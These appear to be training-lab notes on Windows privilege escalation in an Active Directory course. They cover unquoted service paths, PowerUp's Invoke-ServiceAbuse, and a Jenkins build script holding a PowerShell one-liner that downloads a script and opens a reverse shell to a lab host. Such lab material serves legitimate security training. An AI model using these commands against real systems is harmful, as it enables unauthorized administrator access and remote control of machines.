# Privilege Esclation

Local privilege esclation done by service issue

There are three type of service issue are there:

Services Issues using PowerUp
- 1) Get services with unquoted paths and a space in their name.
>Get-ServiceUnquoted -Verbose
- 2) Get services where the current user can write to its binary path or
change arguments to the binary
>Get-ModifiableServiceFile -Verbose
- 3) Get the services whose configuration current user can modify.
>Get-ModifiableService -Verbose

When we run this command 
>Get-WMIObject -Class win32_service | select pathname

this will list all path of running services

`Note: This command is execute in Domain Administrator`


- **First**

If service is running with qoute any one can alter data
Like: 
`C:\FTPServer\FTP server\Filezilla\ftp.exe`
This is service path and having space

If we replace the file or create a malicious file of name FTP.exe
whenever FTP sercice restart it will execute FTP.exe
`C:\FTPServer\FTP.exe`

If it was Quoted it will run exactly same path what it was configured.

- **Second**
  
If executable permission is not set properly like user can edit it binary or put metasploit payload in executable file this create vulnerability

- **Third**
  
If command executable permission is not configured properly means, there are some command and built in tool which user do not have access to run. If user are able to run  built in command and tool. This creates a vulnerability.


### Exploit a service on dcorp-studentx and elevate privileges to local administrator. 

Use `powerup.ps1`
>Invoke-AllChecks

We will get all service name with path.\
Abuse service detail with path where we can check the path is qouted or not.

We  will get all service permission information

Run command to check service abuse function
> help Invoke-ServiceAbuse -Example

This command show how to abuse vulnerable service 

Commmand 
>Invoke-ServiceAbuse -Name Abbyserver -UserName dcorp/student1 -Verbose
![image](https://github.com/peaceasad/Active-Directory/assets/59176416/7bfefc76-20d4-46a4-8c81-fcd12aee4b76)




Above pic is example how this function work

Now run command to check administrator
>net localgroup Administrators

### Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
Through Jenkins we will get admin shell  of CI admin.  
Jenking is running on $ip:8080 

Default Username and password is builduser:builduser

Use one of Project and confifure a script
(See lab manual page 33)
`powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -
UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port
443`

Than open netcat listner in student machine 

Open HFS server in student vm to send file   
HFS is like python server we start to send data over http.

Now click on build to execute project on jenkin server, wait for moment we will get reverse connection.



